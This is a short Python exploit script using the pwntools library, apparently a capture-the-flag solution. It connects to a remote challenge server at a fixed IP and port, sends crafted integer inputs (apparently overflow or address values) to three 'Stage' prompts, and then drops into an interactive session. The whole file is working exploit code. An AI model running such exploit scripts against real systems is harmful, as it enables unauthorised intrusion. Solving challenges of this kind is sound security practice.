#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2117
r = remote(ip, prot)
#r = process("./binary")

r.recvuntil("Stage 1")
r.sendline(str("1048577"))

r.recvuntil("Stage 2")
r.sendline(str("100 256 4207849484"))

r.recvuntil("Stage 3")
r.sendline(str("6295676"))

r.interactive()